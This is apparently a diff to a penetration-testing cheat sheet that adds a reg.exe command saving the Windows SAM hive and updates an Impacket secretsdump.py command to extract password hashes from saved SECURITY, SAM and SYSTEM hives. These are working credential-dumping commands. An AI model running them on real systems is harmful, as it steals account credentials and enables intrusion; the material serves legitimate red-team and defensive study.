@@ -126,10 +126,11 @@ secretsdump.py -system <path_to_system_hive> -ntds <path_to_ntds.dit> LOCAL
 ````
 reg.exe save hklm\security C:\temp\security.save
 reg.exe save hklm\system C:\temp\system.save
+reg.exe save hklm\SAM C:\temp\sam.save
 ````
-- Extract hashes from exfiled SECURITY and SYSTEM
+- Extract hashes from exfiled SECURITY SAM and SYSTEM
 ````
-python3 secretsdump.py -security security.save -system system.save LOCAL
+python3 secretsdump.py -security security.save -system system.save -sam sam.save LOCAL
 ````
 
 #### Another Cheatsheet
